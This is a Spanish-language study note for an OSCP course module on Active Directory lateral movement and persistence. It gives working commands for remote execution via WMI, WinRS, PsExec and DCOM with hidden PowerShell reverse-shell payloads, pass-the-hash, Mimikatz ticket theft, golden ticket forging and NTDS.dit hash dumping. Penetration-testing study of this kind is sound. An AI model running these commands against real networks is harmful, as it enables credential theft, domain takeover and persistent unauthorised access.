---
tipo: modulo
modulo: 24
estado: repasado
tags:
  - oscp
  - ad
  - explotacion
  - post-explotacion
  - windows
fecha: 2026-10-06
---

# 24 - Lateral Movement in Active Directory

> [!abstract] Resumen
> Usar credenciales/hashes/tickets ya obtenidos para **ejecutar código en otras máquinas** del dominio y luego **mantener acceso**.
> - **24.1 Lateral movement** (casi todo requiere ser **admin local** en el destino; con usuario de **dominio** no aplican las UAC remote restrictions):
>   - **WMI** (RPC 135) y **WinRM/WinRS** (5985/5986) → crear procesos remotos (`Win32_Process::Create`, `winrs`, `New-PSSession`).
>   - **PsExec** (ADMIN$, 445, crea servicio) → shell interactiva remota.
>   - **Pass the Hash** (solo **NTLM**): autenticar con el **hash NTLM** (`impacket-wmiexec -hashes`).
>   - **Overpass the Hash**: convertir hash NTLM → **TGT Kerberos** (`sekurlsa::pth`) y usar herramientas Kerberos (PsExec por **hostname**).
>   - **Pass the Ticket**: exportar (`sekurlsa::tickets /export`) e inyectar (`kerberos::ptt`) un **TGS** ajeno (los propios no requieren admin).
>   - **DCOM**: `MMC20.Application` → `ExecuteShellCommand` (RPC 135, admin local).
> - **24.2 Persistencia**:
>   - **Golden Ticket**: con el hash de **krbtgt** forjar TGTs como **Domain Admin** para cualquier user (persistencia; krbtgt casi nunca cambia).
>   - **Shadow Copy**: `vshadow` + copiar **NTDS.dit** + `reg save SYSTEM` → `impacket-secretsdump ... LOCAL` = todos los hashes del dominio.
> Idea clave del examen: casi todo exige **admin local** en el destino. **PtH = NTLM**; si el objetivo fuerza Kerberos usa **overpass/pass-the-ticket**. PsExec por **IP → NTLM**, por **hostname → Kerberos** (importa con golden ticket).

## Conceptos clave
- **Lateral movement**: reutilizar "material de autenticación" (cuenta válida, hash NTLM, ticket Kerberos) para moverse. Enumerar sigue siendo útil (redes nuevas).
- **Requisito común**: ser **admin local** en el destino. Un **domain user** que es admin local **no** sufre UAC remote restrictions (sí un local account no-dominio).
- **WMI**: RPC **135** + puerto alto para datos. `wmic ... process call create` (deprecado) o PowerShell con **CIM/DCOM** (`New-CimSession`, `Invoke-CimMethod Win32_Process Create`). Procesos nacen en **session 0**.
- **WinRM/WinRS**: WS-Management sobre HTTP **5985** / HTTPS **5986**. `winrs -r:` o PowerShell Remoting (`New-PSSession`/`Enter-PSSession`). User debe estar en **Administrators** o **Remote Management Users**.
- **PsExec**: escribe `psexesvc.exe` en C:\Windows, crea un **servicio** y ejecuta el comando como hijo. Requiere **admin local + ADMIN$ + File&Printer Sharing**.
- **Pass the Hash (PtH)**: autenticar con el **hash NTLM** (no password). **Solo NTLM**, no Kerberos. Requiere SMB/445 + ADMIN$ + admin local. Tras el update de 2014 solo vale el **Administrator built-in** y cuentas de **dominio** (no otros admin locales).
- **Overpass the Hash (pass-the-key)**: `sekurlsa::pth` crea un proceso con el hash NTLM; al tocar la red (`net use`) genera un **TGT/TGS reales** → usas herramientas **Kerberos**. `whoami` sigue mostrando el user original (mira solo el token, no los tickets).
- **Pass the Ticket**: el **TGS** se puede exportar e **inyectar** en otra sesión. TGS = específico de un SPN; TGT = reutilizable (~10h, no atado a host). Inyectar **tus propios** tickets no requiere admin.
- **DCOM**: COM sobre red (RPC **135**), admin local. `MMC20.Application` expone `Document.ActiveView.ExecuteShellCommand`.
- **Golden Ticket**: TGT forjado con el hash de **krbtgt** (secreto del KDC). Permite ponerte en **Domain Admins** y accede a **todo** el dominio. Persistencia porque krbtgt **no rota** (salvo upgrade de functional level pre-2008). Forjarlo no requiere privilegios; **obtener el hash de krbtgt sí** (DCSync / comprometer el DC).
- **Golden vs Silver**: golden = hash de **krbtgt** → TGT → **todo el dominio**. Silver = hash del **SPN** → TGS → **un servicio** (módulo 23).
- **Shadow Copy / NTDS.dit**: snapshot VSS (`vshadow`) para copiar `ntds.dit` (bloqueado en caliente) + la hive **SYSTEM** → `secretsdump LOCAL` saca todos los NTLM/Kerberos keys offline.

> [!tip] Idea para el examen
> **PtH funciona solo con NTLM** → si el servicio exige Kerberos, convierte el hash con **overpass-the-hash** (`sekurlsa::pth`) y usa PsExec/winrs **por hostname**. Con **golden ticket**, conecta PsExec **por hostname** (fuerza Kerberos); **por IP usa NTLM** y te bloquea. Para dumpear todo el dominio sin tocar LSASS del DC: **DCSync** (módulo 23) o **Shadow Copy + secretsdump**. El reverse shell PowerShell se codifica en **base64 UTF-16LE** (`-e`) para no escapar caracteres en los payloads WMI/WinRS/DCOM.

---

## 24.1 Técnicas de lateral movement

Reverse shell reutilizable (payload base64 para WMI/WinRS/DCOM):
```python
# encode.py — PS reverse shell -> base64 UTF-16LE
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
```

### WMI
```powershell
# wmic (deprecado)
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
# PowerShell (CIM sobre DCOM)
$secpw = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force
$cred  = New-Object System.Management.Automation.PSCredential 'jen',$secpw
$opt = New-CimSessionOption -Protocol DCOM
$sess = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $opt
Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -nop -w hidden -e <b64>'}
```

### WinRM / WinRS
```powershell
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e <b64>"
# PowerShell Remoting
$sess = New-PSSession -ComputerName 192.168.50.73 -Credential $cred
Enter-PSSession $sess
```

### PsExec
```powershell
.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd    # shell interactiva (admin local + ADMIN$)
```

### Pass the Hash (NTLM)
Ver nota → [[Pass-the-Hash]].
```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
# tambien: impacket-psexec / smbclient --pw-nt-hash / crackmapexec -H
```

### Overpass the Hash
Ver nota → [[Overpass-the-Hash]].
```text
# Mimikatz (admin local): hash NTLM -> proceso en contexto del user
privilege::debug
sekurlsa::logonpasswords                 # obtener el NTLM cacheado (p.ej. jen)
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def...3075 /run:powershell
```
```powershell
net use \\files04        # genera TGT/TGS reales ; klist para verlos
.\PsExec.exe \\files04 cmd   # PsExec por HOSTNAME = Kerberos (no acepta hash)
```

### Pass the Ticket
Ver nota → [[Pass-the-Ticket]].
```text
privilege::debug
sekurlsa::tickets /export               # vuelca .kirbi de TGT/TGS en memoria
kerberos::ptt [0;...]-dave@cifs-web04.kirbi   # inyecta el TGS de otro user
```
```powershell
klist ; ls \\web04\backup               # ahora accedes como el dueño del ticket
```

### DCOM
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <b64>","7")
```

---

## 24.2 Persistencia

### Golden Ticket
Ver nota → [[Golden Ticket]]. Requiere hash de **krbtgt** (de un DC ya comprometido / DCSync).
```text
# En el DC (jeffadmin): sacar el hash de krbtgt
privilege::debug
lsadump::lsa /patch                      # NTLM de krbtgt (y Administrator)
```
```text
# En cualquier host (jen): forjar e inyectar el golden ticket
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6...8f47 /ptt
misc::cmd
```
```powershell
PsExec.exe \\dc1 cmd.exe                  # por HOSTNAME = Kerberos -> acceso ; por IP = NTLM -> denegado
whoami /groups                            # ahora Domain Admins, Enterprise Admins...
```

### Shadow Copy → volcar NTDS.dit
Ver nota → [[Dump NTDS.dit]]. Como Domain Admin en el DC.
```powershell
vshadow.exe -nw -p C:                     # crea el shadow copy (anota el device name)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL   # todos los hashes offline
```

---

## Comandos
```powershell
# Lateral movement (admin local en destino)
wmic /node:<ip> /user:<u> /password:<p> process call create "<cmd>"
winrs -r:<host> -u:<u> -p:<p> "<cmd>"
New-PSSession -ComputerName <ip> -Credential $cred ; Enter-PSSession <id>
.\PsExec64.exe -i \\<host> -u <dom\u> -p <p> cmd
# Overpass / Pass-the-ticket / Golden (Mimikatz)
sekurlsa::pth /user:<u> /domain:<d> /ntlm:<hash> /run:powershell
sekurlsa::tickets /export ; kerberos::ptt <ticket.kirbi>
kerberos::golden /user:<u> /domain:<d> /sid:<SID> /krbtgt:<hash> /ptt
lsadump::lsa /patch
```
```bash
# PtH y dump de dominio (Kali)
impacket-wmiexec -hashes :<NTLM> <user>@<ip>
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
| Técnica | Requisito | Auth | Herramienta |
|---|---|---|---|
| WMI | admin local | — | wmic / Invoke-CimMethod |
| WinRM/WinRS | admin o Remote Mgmt Users | — | winrs / New-PSSession |
| PsExec | admin local + ADMIN$ | — | PsExec64 |
| Pass the Hash | admin local + 445 | **NTLM** | impacket-wmiexec -hashes |
| Overpass the Hash | hash NTLM del user | NTLM→**Kerberos** | sekurlsa::pth |
| Pass the Ticket | ticket en memoria | **Kerberos** | sekurlsa::tickets/ptt |
| DCOM | admin local | — | MMC20.Application |
| Golden Ticket | hash de **krbtgt** | **Kerberos** | kerberos::golden |
| Shadow Copy | Domain Admin en DC | — | vshadow + secretsdump |

> [!warning] Errores comunes / cosas que fallan
> - Lateral movement sin ser **admin local** en el destino → acceso denegado.
> - **PtH** contra servicio **Kerberos-only** → no funciona; usa overpass/pass-the-ticket.
> - PsExec/golden por **IP** → fuerza NTLM (bloqueado); usa **hostname** para Kerberos.
> - `whoami` tras `sekurlsa::pth` muestra el **user original** (normal; solo lee el token).
> - Golden ticket (post jul-2022): el `/user:` debe ser una cuenta **existente**.
> - Reverse shell en payloads WMI/WinRS/DCOM: codificar en **base64 UTF-16LE**.

## Ejemplo práctico
> [!example] Encadenar en corp.com
> 1. Como `jeff` (admin local en CLIENT74) muevo a **FILES04** con creds de `jen` (admin local allí): WMI/WinRS/PsExec/DCOM → reverse shell como `corp\jen`.
> 2. Con el hash NTLM del Administrator local → **PtH** (`impacket-wmiexec`) directo desde Kali.
> 3. Hash NTLM de `jen` cacheado → **overpass-the-hash** (`sekurlsa::pth`) → TGT → PsExec por hostname.
> 4. Sesión de `dave` en la máquina → **pass-the-ticket** (`sekurlsa::tickets /export` + `kerberos::ptt`) → accedo a `\\web04\backup`.
> 5. Comprometido el DC → `lsadump::lsa` saca krbtgt → **golden ticket** (persistencia) y/o **Shadow Copy** → `secretsdump` de todo el dominio.

## Relacionado
- Técnicas: [[Overpass-the-Hash]] · [[Pass-the-Ticket]] · [[Golden Ticket]] · [[Dump NTDS.dit]] · [[Pass-the-Hash]] · [[Mimikatz]] · [[DCSync]] · [[Silver Ticket]]
- Cheatsheet: [[Active Directory]]
- Módulo previo: [[23 - Attacking Active Directory Authentication]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - ¿Cuándo elegir wmiexec vs psexec vs smbexec vs winrs en el examen (ruido/detección)?
> - Pass-the-ticket desde Kali con impacket (`-k`, `KRB5CCNAME`, `ticketer`): repasar flujo.
> - Diferencia fina overpass-the-hash vs pass-the-key y el etype resultante (RC4 vs AES).
